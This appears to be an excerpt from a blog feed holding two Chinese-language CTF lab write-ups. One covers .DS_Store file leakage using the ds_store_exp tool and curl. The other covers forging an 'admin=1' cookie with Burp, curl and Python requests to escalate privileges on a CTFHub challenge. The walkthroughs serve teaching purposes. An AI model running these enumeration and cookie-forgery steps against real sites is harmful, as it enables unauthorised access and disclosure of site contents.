        <content type="html"><![CDATA[<h1 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h1><blockquote><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p></blockquote><p><img src="/assets/1.png"></p><h2 id="Way1：ds-store-exp"><a href="#Way1：ds-store-exp" class="headerlink" title="Way1：ds_store_exp"></a>Way1：ds_store_exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">pip install ds-store</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/lijiejie/ds_store_exp.git</span><br><span class="line"><span class="built_in">cd</span> ds_store_exp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line">python3 ds_store_exp.py http://&lt;题目地址&gt;/.DS_Store</span><br></pre></td></tr></table></figure><p><img src="/assets/2.png"></p><h2 id="Way2：curl"><a href="#Way2：curl" class="headerlink" title="Way2：curl"></a>Way2：curl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o .DS_Store http://&lt;题目地址&gt;/.DS_Store</span><br></pre></td></tr></table></figure><p><img src="/assets/3.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2026/02/26/Cookie/Cookie/"/>
      <url>/2026/02/26/Cookie/Cookie/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFHub-Web-—-Cookie"><a href="#CTFHub-Web-—-Cookie" class="headerlink" title="CTFHub Web — Cookie"></a>CTFHub Web — Cookie</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开页面，提示 “hello guest. only admin can get flag.”，说明当前身份是 guest，需要想办法变成 admin。</p><p><img src="/assets/01_challenge_page.png" alt="题目页面"></p><hr><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>用 Burp 抓包，在第二个 GET 请求里发现响应头里带了 <code>Set-Cookie: admin=0</code>，说明服务端是靠这个 Cookie 来判断身份的，把值改成 <code>1</code> 就能伪造成 admin。</p><hr><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><p>在 Repeater 里把请求头中的 Cookie 改为 <code>admin=1</code>，发送请求，响应里直接出 flag。</p><p><img src="/assets/02_burpsuite_cookie_admin_flag.png" alt="Burp Suite 修改 Cookie 获取 flag"></p><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>打开页面的时候浏览器会发两个请求，第一个 GET 服务器返回 302，同时 <code>Set-Cookie: admin=0</code>，浏览器跟着跳到第二个请求才带上 Cookie。用 curl 模拟这个过程：先用 <code>-c</code> 把 Cookie 存下来看看里面有什么，确认字段名是 <code>admin</code> 之后，直接带 <code>admin=1</code> 发请求就拿到 flag 了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一步：保存 Cookie 到文件，确认字段名</span></span><br><span class="line">curl -c cookie.txt http://challenge-xxx.ctfhub.com:10800/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步：带修改后的 Cookie 发请求</span></span><br><span class="line">curl -b <span class="string">&quot;admin=1&quot;</span> http://challenge-xxx.ctfhub.com:10800/ | grep ctfhub</span><br></pre></td></tr></table></figure><p><code>cookie.txt</code> 里可以看到服务端下发的 <code>admin=0</code>：</p><p><img src="/assets/05_cookie_txt.png" alt="cookie.txt 内容"></p><p>带上 <code>admin=1</code> 之后成功拿到 flag：</p><p><img src="/assets/03_curl_flag.png" alt="curl 获取 flag"></p><h3 id="Python-requests"><a href="#Python-requests" class="headerlink" title="Python requests"></a>Python requests</h3><p>同理，知道字段名之后直接在 <code>cookies</code> 参数里传进去：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&quot;http://challenge-xxx.ctfhub.com:10800/&quot;</span>, cookies=&#123;<span class="string">&quot;admin&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="/assets/04_python_requests_flag.png" alt="Python requests 获取 flag"></p><blockquote><p>Cookie 伪造是 web 里最经典的入门漏洞之一，服务端把权限判断全靠客户端传来的 Cookie，不做任何验证，改一个字段就能越权。遇到这种题，第一反应就是抓包看 Cookie 里有没有可疑的字段。</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
